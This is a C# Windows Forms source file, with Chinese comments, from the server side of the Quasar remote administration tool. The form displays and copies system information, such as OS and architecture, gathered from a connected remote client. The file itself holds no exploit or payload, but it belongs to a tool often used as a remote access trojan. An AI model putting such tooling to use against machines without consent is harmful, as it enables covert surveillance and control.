﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using Quasar.Common.Messages;
using Quasar.Server.Extensions;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;

namespace Quasar.Server.Forms
{
    public partial class FrmSystemInformation : Form
    {
        /// <summary>
        /// 可用于系统信息的客户端。
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// 用于处理与客户端通信的消息处理器。
        /// </summary>
        private readonly SystemInformationHandler _sysInfoHandler;

        /// <summary>
        /// 为每个客户端保存已打开的系统信息表单。
        /// </summary>
        private static readonly Dictionary<Client, FrmSystemInformation> OpenedForms = new Dictionary<Client, FrmSystemInformation>();

        /// <summary>
        /// 为客户端创建新的系统信息表单，或者如果已存在则获取当前打开的表单。
        /// </summary>
        /// <param name="client">用于系统信息表单的客户端。</param>
        /// <returns>
        /// 如果当前没有打开的系统信息表单，则为客户端返回一个新的系统信息表单，否则创建一个新的。
        /// </returns>
        public static FrmSystemInformation CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmSystemInformation f = new FrmSystemInformation(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// 使用给定的客户端初始化 <see cref="FrmSystemInformation"/> 类的新实例。
        /// </summary>
        /// <param name="client">用于远程桌面表单的客户端。</param>
        public FrmSystemInformation(Client client)
        {
            _connectClient = client;
            _sysInfoHandler = new SystemInformationHandler(client);

            RegisterMessageHandler();
            InitializeComponent();
        }

        /// <summary>
        /// 注册系统信息消息处理器以进行客户端通信。
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _sysInfoHandler.ProgressChanged += SystemInformationChanged;
            MessageHandler.Register(_sysInfoHandler);
        }

        /// <summary>
        /// 注销系统信息消息处理器。
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_sysInfoHandler);
            _sysInfoHandler.ProgressChanged -= SystemInformationChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// 当客户端断开连接时调用。
        /// </summary>
        /// <param name="client">断开连接的客户端。</param>
        /// <param name="connected">如果客户端连接则为True，如果断开连接则为false</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmSystemInformation_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("System Information", _connectClient);
            _sysInfoHandler.RefreshSystemInformation();
            AddBasicSystemInformation();
        }

        private void FrmSystemInformation_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }

        private void SystemInformationChanged(object sender, List<Tuple<string, string>> infos)
        {
            // remove "Loading..." information
            lstSystem.Items.RemoveAt(2);

            foreach (var info in infos)
            {
                var lvi = new ListViewItem(new[] {info.Item1, info.Item2});
                lstSystem.Items.Add(lvi);
            }

            lstSystem.AutosizeColumns();
        }

        private void copyAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstSystem.Items.Count == 0) return;

            string output = string.Empty;

            foreach (ListViewItem lvi in lstSystem.Items)
            {
                output = lvi.SubItems.Cast<ListViewItem.ListViewSubItem>().Aggregate(output, (current, lvs) => current + (lvs.Text + " : "));
                output = output.Remove(output.Length - 3);
                output = output + "\r\n";
            }

            ClipboardHelper.SetClipboardTextSafe(output);
        }

        private void copySelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstSystem.SelectedItems.Count == 0) return;

            string output = string.Empty;

            foreach (ListViewItem lvi in lstSystem.SelectedItems)
            {
                output = lvi.SubItems.Cast<ListViewItem.ListViewSubItem>().Aggregate(output, (current, lvs) => current + (lvs.Text + " : "));
                output = output.Remove(output.Length - 3);
                output = output + "\r\n";
            }

            ClipboardHelper.SetClipboardTextSafe(output);
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstSystem.Items.Clear();
            _sysInfoHandler.RefreshSystemInformation();
            AddBasicSystemInformation();
        }

        /// <summary>
        /// 将已有的基本系统信息添加到ListView中。
        /// </summary>
        private void AddBasicSystemInformation()
        {
            ListViewItem lvi =
                new ListViewItem(new[] {"Operating System", _connectClient.Value.OperatingSystem});
            lstSystem.Items.Add(lvi);
            lvi =
                new ListViewItem(new[]
                {
                    "Architecture",
                    (_connectClient.Value.OperatingSystem.Contains("32 Bit")) ? "x86 (32 Bit)" : "x64 (64 Bit)"
                });
            lstSystem.Items.Add(lvi);
            lvi = new ListViewItem(new[] {"", "Getting more information..."});
            lstSystem.Items.Add(lvi);
        }
    }
}